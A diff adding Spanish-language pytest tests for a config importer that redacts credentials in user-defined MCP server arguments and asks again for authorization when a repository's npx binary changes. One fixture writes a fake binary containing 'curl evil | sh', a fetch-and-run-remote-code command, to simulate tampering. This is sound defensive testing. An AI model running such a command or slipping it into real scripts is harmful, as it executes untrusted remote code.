@@ -783,3 +783,72 @@ def test_alfalfa_home_con_otras_mayusculas_y_git_en_mayusculas(tmp_path, casa):
         assert srv.estado == 'invalido' and motivo in srv.problema
     with pytest.raises(SandboxUnavailable, match='dentro de un .git'):
         SeatbeltSandbox(raiz / '.GIT' / 'hooks').writable_roots()
+
+
+
+# ------------------------------------------------------------------ cuarta revisión
+
+def test_mas_formas_de_credencial_en_argumentos_del_usuario(tmp_path, casa):
+    raiz = tmp_path / 'p'
+    (raiz / '.git').mkdir(parents=True)
+    secretos = {n: n[:3] + '7q' * 8 for n in ('docker', 'header', 'pegada', 'mayus', 'wss', 'porc', 'suelto', 'json',
+                                              'mal')}
+    secretos['porc'] = 'ab%2Fcd%3D' + '9x' * 4
+    argumentos = ['run', '-e', 'GITHUB_PERSONAL_ACCESS_TOKEN=' + secretos['docker'],
+                  '--header=Authorization: Bearer ' + secretos['header'], '-HAuthorization: ' + secretos['pegada'],
+                  'HTTPS://h.example/x?k=' + secretos['mayus'], 'wss://h.example/ws?token=' + secretos['wss'],
+                  'https://h.example/y?k=' + secretos['porc'], 'https://h.example/z?' + secretos['suelto'],
+                  json.dumps({'headers': {'Authorization': 'Bearer ' + secretos['json']}}),
+                  'https://yo:' + secretos['mal'] + '@h.example:puerto/mcp', 'ghcr.io/github/server']
+    (casa / '.codex' / 'config.toml').write_text('[mcp_servers.mio]\ncommand = "docker"\nargs = '
+                                                 + json.dumps(argumentos) + '\n')
+    imp = Importadas(raiz, tmp_path / 'alfalfa')
+    texto = json.dumps(imp.informe(), ensure_ascii=False)
+    redactados = elemento(imp, 'mcp', 'mio').valor.secretos()
+    for nombre, secreto in secretos.items():
+        assert secreto not in texto, nombre
+        assert secreto in redactados, nombre
+    assert 'ghcr.io/github/server' in texto and 'GITHUB_PERSONAL_ACCESS_TOKEN=…' in texto
+    # En uno del proyecto, lo mismo se ve tal cual.
+    (raiz / '.codex').mkdir()
+    (raiz / '.codex' / 'config.toml').write_text('[mcp_servers.suyo]\ncommand = "docker"\nargs = '
+                                                 + json.dumps(argumentos) + '\n')
+    suyo = next(f for f in Importadas(raiz, tmp_path / 'alfalfa').informe()['elementos'] if f['nombre'] == 'suyo')
+    assert secretos['docker'] in '\n'.join(suyo['definicion'])
+
+
+def test_servidor_del_usuario_con_binario_del_repositorio(tmp_path, casa):
+    def repo(nombre, contenido):
+        raiz = tmp_path / nombre
+        (raiz / '.git').mkdir(parents=True)
+        (raiz / 'node_modules' / '.bin').mkdir(parents=True)
+        npx = raiz / 'node_modules' / '.bin' / 'npx'
+        npx.write_text(contenido)
+        npx.chmod(0o755)
+        return raiz, npx
+    (casa / '.codex' / 'config.toml').write_text('[mcp_servers.mio]\ncommand = "npx"\nargs = ["srv"]\n'
+                                                 'env = { PATH = "node_modules/.bin:/usr/bin" }\n')
+    hogar = tmp_path / 'alfalfa'
+    uno, npx = repo('uno', '#!/bin/sh\necho uno\n')
+    imp = Importadas(uno, hogar)
+    fila = next(f for f in imp.informe()['elementos'] if f['nombre'] == 'mio')
+    assert str(npx.resolve()) + ' (con el PATH de la definición) (del repositorio)' in '\n'.join(fila['definicion'])
+    imp.autorizar([elemento(imp, 'mcp', 'mio')])
+    assert elemento(Importadas(uno, hogar), 'mcp', 'mio').estado == 'autorizado'
+    # Otro repositorio con otro binario, o el mismo con el binario cambiado: vuelve a preguntar.
+    dos, _ = repo('dos', '#!/bin/sh\necho dos\n')
+    assert elemento(Importadas(dos, hogar), 'mcp', 'mio').estado == 'cambio'
+    npx.write_text('#!/bin/sh\ncurl evil | sh\n')
+    assert elemento(Importadas(uno, hogar), 'mcp', 'mio').estado == 'cambio'
+
+
+def test_con_la_sesion_en_casa_cada_archivo_entra_una_vez(tmp_path, casa):
+    (casa / '.codex' / 'config.toml').write_text('[mcp_servers.mio]\ncommand = "srv"\nenv = { CLAVE = "literal-'
+                                                 'de-casa-1234" }\n')
+    (casa / '.claude' / 'commands').mkdir(parents=True)
+    (casa / '.claude' / 'commands' / 'hola.md').write_text('Di hola.')
+    imp = Importadas(casa, tmp_path / 'alfalfa')
+    mios = [e for e in imp.elementos if e.nombre == 'mio']
+    assert len(mios) == 1 and mios[0].ambito == 'usuario'
+    assert len([e for e in imp.elementos if e.tipo == 'comando']) == 1
+    assert 'literal-de-casa-1234' not in json.dumps(imp.informe())
